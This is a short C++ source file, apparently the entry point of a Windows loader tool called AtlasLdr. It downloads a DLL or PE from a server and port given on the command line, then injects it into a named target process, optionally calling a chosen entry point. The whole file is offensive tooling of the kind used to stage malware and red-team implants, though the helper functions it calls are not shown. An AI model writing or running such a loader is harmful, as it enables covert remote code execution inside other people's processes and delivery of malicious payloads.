#include <winhttpapi.h>
#include <AtlasLdr.h>

int main(int argc, char* argv[]){

    if(argc < 5){
        printf("%s - Usage: %s process server port dll/pe <entrypoint>\n",info, argv[0]);
        exit(EXIT_FAILURE);
    }

    char* target = argv[1];
    char* server = argv[2];
    char* port = argv[3];
    char* dll = argv[4];
    char* entryPoint = NULL;

    if(argc == 6){
        entryPoint = argv[5];
    }
    
    wchar_t* w_server = new wchar_t[strlen(server) + 1];
    wchar_t* w_dll = new wchar_t[strlen(dll) + 1];

    mbstowcs(w_server, server, strlen(server) + 1);
    mbstowcs(w_dll, dll, strlen(dll) + 1);

    char * buffer = ObtainRock(w_server, atoi(port), w_dll);

    delete[] w_server;
    delete[] w_dll;

    size_t target_len = strlen(target) + 1;
    wchar_t* w_target = new wchar_t[target_len];
    mbstowcs(w_target, target, target_len);

    AtlasInject((PVOID)buffer, w_target, entryPoint);
}